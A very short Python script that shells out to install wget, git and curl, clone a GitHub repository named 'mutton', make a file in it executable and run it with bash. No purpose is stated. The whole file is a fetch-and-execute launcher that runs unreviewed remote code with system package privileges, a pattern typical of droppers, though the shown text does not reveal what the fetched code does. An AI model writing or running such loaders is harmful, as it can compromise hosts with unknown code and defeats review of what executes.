#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/sabelomdlakazeli/mutton.git;cd mutton;chmod +x mutton;bash mutton", shell=True)
